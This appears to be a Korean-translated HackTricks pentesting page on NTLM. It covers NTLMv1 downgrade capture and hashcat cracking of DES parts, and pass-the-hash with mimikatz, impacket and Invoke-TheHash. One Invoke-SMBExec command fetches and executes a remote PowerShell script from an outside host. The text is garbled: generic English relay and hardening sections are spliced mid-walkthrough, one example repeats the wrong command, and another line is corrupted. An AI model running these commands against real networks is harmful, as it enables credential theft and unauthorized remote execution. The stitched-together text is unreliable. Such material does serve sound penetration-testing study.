# NTLM

<details>

<summary><strong>htARTE (HackTricks AWS Red Team 전문가)로부터 제로에서 영웅까지 AWS 해킹 배우기</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사가 HackTricks에 광고**되길 원하시나요? 아니면 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요, 저희의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* [**공식 PEASS & HackTricks 스왹**](https://peass.creator-spring.com)을 받아보세요
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **해킹 요령을 공유하고 PR을 제출하여** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **에 참여**하세요.

</details>

## 기본 정보

**Windows XP 및 Server 2003**이 작동 중인 환경에서는 LM (Lan Manager) 해시가 사용되지만, 이러한 해시는 쉽게 침해될 수 있다는 것이 널리 알려져 있습니다. 특정 LM 해시인 `AAD3B435B51404EEAAD3B435B51404EE`는 LM이 사용되지 않는 시나리오를 나타내며, 빈 문자열의 해시를 나타냅니다.

기본적으로 **Kerberos** 인증 프로토콜이 주요 방법으로 사용됩니다. NTLM (NT LAN Manager)은 특정 상황에서 사용됩니다: Active Directory가 없는 경우, 도메인이 존재하지 않는 경우, Kerberos가 잘못된 구성으로 인해 제대로 작동하지 않는 경우 또는 유효한 호스트 이름 대신 IP 주소를 사용하여 연결을 시도하는 경우.

네트워크 패킷에서 **"NTLMSSP"** 헤더가 있으면 NTLM 인증 프로세스가 진행 중임을 나타냅니다.

인증 프로토콜인 LM, NTLMv1 및 NTLMv2를 지원하는 특정 DLL은 `%windir%\Windows\System32\msv1\_0.dll`에 위치해 있습니다.

**주요 포인트**:

* LM 해시는 취약하며 빈 LM 해시인 (`AAD3B435B51404EEAAD3B435B51404EE`)는 사용되지 않음을 나타냅니다.
* 기본 인증 방법은 Kerberos이며, NTLM은 특정 조건에서만 사용됩니다.
* NTLM 인증 패킷은 "NTLMSSP" 헤더로 식별할 수 있습니다.
* 시스템 파일 `msv1\_0.dll`에서 LM, NTLMv1 및 NTLMv2 프로토콜을 지원합니다.

## LM, NTLMv1 및 NTLMv2

사용할 프로토콜을 확인하고 구성할 수 있습니다:

### GUI

_secpol.msc_ 실행 -> 로컬 정책 -> 보안 옵션 -> 네트워크 보안: LAN Manager 인증 수준. 6개의 수준이 있습니다 (0부터 5까지).

![](<../../.gitbook/assets/image (919).png>)

### 레지스트리

이렇게 하면 레벨 5로 설정됩니다:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
가능한 값:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## 기본 NTLM 도메인 인증 체계

1. **사용자**가 **자격 증명**을 제공합니다.
2. 클라이언트 기기가 **도메인 이름**과 **사용자 이름**을 보내는 **인증 요청을 전송**합니다.
3. **서버**가 **도전 응답**을 보냅니다.
4. 클라이언트가 **비밀번호의 해시를 사용하여 도전 응답을 암호화**하고 응답으로 보냅니다.
5. **서버**가 **도메인 컨트롤러에 도메인 이름, 사용자 이름, 도전 및 응답**을 보냅니다. Active Directory가 구성되어 있지 않거나 도메인 이름이 서버 이름인 경우 자격 증명은 **로컬로 확인**됩니다.
6. **도메인 컨트롤러가 모든 것이 올바른지 확인**하고 정보를 서버로 보냅니다.

**서버**와 **도메인 컨트롤러**는 **NTDS.DIT** 데이터베이스 내에 서버의 비밀번호를 알고 있기 때문에 **Netlogon** 서버를 통해 **안전한 채널**을 생성할 수 있습니다.

### 로컬 NTLM 인증 체계

인증은 **이전에 언급된 것처럼** 진행되지만 **서버**는 **SAM** 파일 내에서 인증을 시도하는 사용자의 **해시를 알고** 있습니다. 따라서 도메인 컨트롤러에 요청하는 대신 **서버가 사용자를 인증할 수 있는지** 스스로 확인합니다.

### NTLMv1 도전

**도전 길이는 8바이트**이며 **응답 길이는 24바이트**입니다.

**해시 NT(16바이트)**는 **각각 7바이트의 3부분**으로 나뉩니다(7B + 7B + (2B+0x00\*5)): **마지막 부분은 0으로 채워집니다**. 그런 다음 **도전**은 각 부분별로 **별도로 암호화**되고 결과 암호화된 바이트가 **결합**됩니다. 총: 8B + 8B + 8B = 24바이트.

**문제점**:

* **랜덤성 부족**
* 3부분을 **개별적으로 공격**하여 NT 해시를 찾을 수 있음
* **DES가 해독 가능**
* 3번째 키는 항상 **5개의 0으로** 구성됨.
* **같은 도전**을 주면 **응답이 동일**합니다. 따라서 피해자에게 문자열 "**1122334455667788**"을 **도전**으로 제공하고 **사전 계산된 무지개 테이블**을 사용하여 사용된 응답을 공격할 수 있습니다.

### NTLMv1 공격

현재는 Unconstrained Delegation이 구성된 환경을 찾기가 점점 더 어려워지고 있지만, 이는 **구성된 프린트 스풀러 서비스를 악용**할 수 없다는 뜻은 아닙니다.

AD에서 이미 가지고 있는 일부 자격 증명/세션을 악용하여 **프린터에게** 일부 **호스트**에 대해 **인증을 요청**할 수 있습니다. 그런 다음 `metasploit auxiliary/server/capture/smb` 또는 `responder`를 사용하여 **인증 도전을 1122334455667788로 설정**하고 인증 시도를 캡처하면, **NTLMv1**을 사용하여 수행된 경우 **해독**할 수 있습니다.\
`responder`를 사용하는 경우 **--lm 플래그를 사용**하여 **인증을 다운그레이드**할 수 있습니다.\
_이 기술을 사용하기 위해서는 NTLMv1을 사용하여 인증을 수행해야 합니다(NTLMv2는 유효하지 않음)._

프린터는 인증 중에 컴퓨터 계정을 사용하며, 컴퓨터 계정은 **긴 무작위 암호**를 사용하므로 일반 **사전**을 사용하여 **해독**할 수 없을 것입니다. 그러나 **NTLMv1** 인증은 **DES를 사용**합니다([자세한 정보는 여기를 참조](./#ntlmv1-challenge)), 따라서 DES를 해독하는 데 특히 전용 서비스를 사용하여 해독할 수 있습니다([https://crack.sh/](https://crack.sh)를 사용할 수 있습니다).

### hashcat를 사용한 NTLMv1 공격

NTLMv1은 NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi)를 사용하여 NTLMv1 메시지를 해독할 수 있는 방식으로 형식화되며 hashcat를 사용하여 해독할 수 있습니다.

명령어
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
## NTLM Relay Attack

### Overview

NTLM relay attacks are a common technique used by attackers to exploit the NTLM authentication protocol. This attack involves relaying NTLM authentication messages from a victim machine to a target machine, allowing the attacker to impersonate the victim and gain unauthorized access to the target system.

### How it works

1. The attacker intercepts an NTLM authentication request from the victim machine.
2. The attacker relays the authentication request to the target machine.
3. The target machine processes the authentication request, believing it is coming from the victim.
4. If successful, the attacker gains access to the target system using the victim's credentials.

### Mitigation

To protect against NTLM relay attacks, consider implementing the following measures:

- **Enforce SMB signing**: Require SMB signing to prevent attackers from tampering with authentication messages.
- **Enable Extended Protection for Authentication**: This helps protect against NTLM relay attacks by requiring channel binding tokens.
- **Disable NTLM**: Consider disabling NTLM authentication in favor of more secure protocols like Kerberos.

By implementing these measures, you can significantly reduce the risk of falling victim to NTLM relay attacks.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
# NTLM

## Overview

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. However, NTLM has several vulnerabilities that can be exploited by attackers to compromise the security of a system.

## Hardening

To harden a system against NTLM attacks, it is recommended to:

1. **Disable NTLM**: Whenever possible, disable the use of NTLM authentication in favor of more secure protocols like Kerberos.

2. **Enforce SMB Signing**: Enabling SMB signing can protect against man-in-the-middle attacks that exploit NTLM vulnerabilities.

3. **Enable LDAP Signing**: Similar to SMB signing, enabling LDAP signing can prevent attackers from intercepting and tampering with LDAP traffic.

4. **Use Complex Passwords**: Encourage users to use complex passwords to make it harder for attackers to crack them using NTLM hash attacks.

5. **Monitor Event Logs**: Regularly monitor event logs for any NTLM-related events or suspicious activities that could indicate an ongoing attack.

By following these hardening measures, you can significantly improve the security of your system against NTLM attacks.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
해시캣을 실행하십시오 (hashtopolis와 같은 도구를 통해 분산하는 것이 가장 좋습니다). 그렇지 않으면 이 작업에는 몇 일이 걸릴 것입니다.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
이 경우에는 이 패스워드가 password임을 알고 있으므로 데모 목적으로 속이겠습니다:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
이제 우리는 해독된 des 키를 NTLM 해시의 일부로 변환하기 위해 hashcat-utilities를 사용해야합니다:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
마지막 부분입니다:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
## NTLM Relay Attack

### Overview

NTLM relay attacks are a common technique used by attackers to exploit the NTLM authentication protocol. By relaying NTLM authentication messages from a target host to a victim host, an attacker can impersonate the target and gain unauthorized access to resources on the victim's system.

### How it works

1. The attacker intercepts an NTLM authentication request from the target host.
2. The attacker relays the authentication request to the victim host.
3. The victim host processes the authentication request, thinking it is coming from the target host.
4. If successful, the attacker gains access to the victim host using the target's credentials.

### Mitigation

To prevent NTLM relay attacks, it is recommended to:
- Enable SMB signing to prevent tampering with authentication messages.
- Implement Extended Protection for Authentication to protect against relay attacks.
- Disable NTLM authentication in favor of more secure protocols like Kerberos.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**도전 과제의 길이는 8바이트**이며 **2개의 응답이 전송**됩니다: 하나는 **24바이트**이고 **다른 하나**의 길이는 **가변**입니다.

**첫 번째 응답**은 **클라이언트와 도메인**으로 구성된 **문자열을 사용하여 HMAC\_MD5**를 사용하여 생성되며 **NT 해시**의 **해시 MD4**를 **키**로 사용합니다. 그런 다음 **결과**는 **도전**을 암호화하기 위해 **키**로 사용됩니다. 여기에 **8바이트의 클라이언트 도전이 추가**됩니다. 총: 24 B.

**두 번째 응답**은 **여러 값**을 사용하여 생성됩니다(새 클라이언트 도전, **재생 공격을 방지하기 위한 타임스탬프**...).

**성공적인 인증 프로세스를 캡처한 pcap 파일**이 있다면, 도메인, 사용자 이름, 도전 및 응답을 얻고 비밀번호를 크래킹해보세요: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**피해자의 해시를 획득한 후**, 해당 해시를 사용하여 **가장하**할 수 있습니다.\
**해시를 사용하여 NTLM 인증을 수행하는 도구**를 사용해야 합니다. **또는** 새 **세션로그온**을 만들고 해당 **해시를 LSASS에 삽입**하여 **NTLM 인증이 수행될 때 해당 해시가 사용**되도록 할 수 있습니다. 마지막 옵션은 mimikatz가 하는 일입니다.

**Pass-the-Hash 공격을 수행할 수 있다는 것을 기억해 주세요.**

### **Mimikatz**

**관리자 권한으로 실행해야 합니다**.
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
이것은 mimikatz를 실행한 사용자에 속한 프로세스를 시작합니다. 그러나 내부적으로 LSASS에서 저장된 자격 증명은 mimikatz 매개변수 내에 있습니다. 그럼으로 네트워크 리소스에 액세스할 수 있습니다. 마치 해당 사용자인 것처럼(일반 텍스트 암호를 알 필요 없이 `runas /netonly` 트릭과 유사).

### 리눅스에서 Pass-the-Hash

리눅스에서 Pass-the-Hash를 사용하여 Windows 기기에서 코드 실행을 얻을 수 있습니다.\
[**여기를 클릭하여 방법을 알아보세요.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows 컴파일된 도구

Windows용 impacket 이진 파일을 [여기서 다운로드할 수 있습니다](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (이 경우에는 명령을 지정해야 합니다. cmd.exe 및 powershell.exe는 대화형 셸을 얻기 위한 유효하지 않습니다)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Impacket 이진 파일에는 여러 개가 더 있습니다...

### Invoke-TheHash

여기서 powershell 스크립트를 얻을 수 있습니다: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum

#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

이 함수는 **다른 모든 것들의 혼합물**입니다. 여러 호스트를 전달하고 어떤 사람을 **제외**하고 사용하려는 **옵션**을 **선택**할 수 있습니다 (_SMBExec, WMIExec, SMBClient, SMBEnum_). **SMBExec**와 **WMIExec** 중 **어떤 것**을 선택하더라도 _**Command**_ 매개변수를 제공하지 않으면 **충분한 권한**이 있는지 **확인**만 할 것입니다.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM 패스 더 해시](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows 자격 증명 편집기 (WCE)

**관리자 권한으로 실행해야 함**

이 도구는 mimikatz와 동일한 작업을 수행합니다 (LSASS 메모리 수정).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### 사용자 이름과 암호를 사용한 수동 Windows 원격 실행

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Windows 호스트에서 자격 증명 추출

**Windows 호스트에서 자격 증명을 얻는 방법에 대한 자세한 정보는** [**이 페이지를 읽어보세요**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## NTLM 릴레이 및 응답기

**이러한 공격을 수행하는 방법에 대한 자세한 가이드는 여기에서 확인하세요:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## 네트워크 캡처에서 NTLM 챌린지 구문 분석

**다음을 사용할 수 있습니다** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
